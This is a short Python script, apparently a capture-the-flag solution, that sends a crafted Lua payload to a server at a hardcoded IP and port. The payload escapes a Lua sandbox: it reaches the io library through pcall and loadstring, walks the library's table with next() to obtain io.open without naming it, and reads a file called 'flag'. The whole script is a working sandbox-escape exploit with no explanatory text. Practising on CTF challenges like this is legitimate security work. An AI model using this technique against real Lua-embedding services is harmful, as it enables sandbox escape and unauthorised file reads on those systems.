import requests

url = 'http://164.92.149.4:1337'

two = '("ab"):find("b")'
io = f'select({two},pcall(loadstring("return(io)")))'
io_open = f'select({two},next({io},next({io},next({io},next({io},next({io},next({io})))))))'
read_flag = f'return({io_open}("flag"):read("a"))'

res = requests.post(url, data=read_flag)
print(res.text)
